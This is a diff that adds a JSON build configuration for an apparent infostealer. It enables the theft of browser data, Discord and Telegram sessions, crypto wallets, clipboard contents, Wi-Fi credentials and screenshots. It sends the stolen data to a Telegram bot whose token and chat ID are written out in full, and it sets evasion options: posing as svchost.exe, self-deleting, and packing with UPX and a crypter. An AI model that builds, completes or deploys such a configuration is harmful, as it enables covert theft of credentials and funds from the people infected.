@@ -1,0 +1,49 @@
+{
+    "antiAnalysis": {
+        "debug": false,
+        "sandbox": false,
+        "sleepEvasion": false,
+        "vm": false
+    },
+    "build": {
+        "architecture": "x64",
+        "compiler": "auto",
+        "iconPath": "",
+        "obfuscate": true,
+        "outputName": "output.exe",
+        "upxPack": true,
+        "useCrypter": true
+    },
+    "captureScreen": true,
+    "exfiltration": {
+        "httpPost": "",
+        "telegramChatId": "8366388220",
+        "telegramToken": "8126342878:AAH42SkAYY1IR1hZuhEzk1o4VKXplTzA6Y0",
+        "webhook": ""
+    },
+    "grabber": {
+        "brave": true,
+        "chrome": true,
+        "clipboard": true,
+        "discord": true,
+        "edge": true,
+        "firefox": true,
+        "telegram": true,
+        "wallets": true,
+        "wifi": true
+    },
+    "stealth": {
+        "melt": true,
+        "mutexName": "",
+        "processName": "svchost.exe",
+        "selfDestruct": true
+    },
+    "systemInfo": {
+        "av": true,
+        "hwid": true,
+        "ip": true,
+        "os": true,
+        "processes": true,
+        "specs": true
+    }
+}
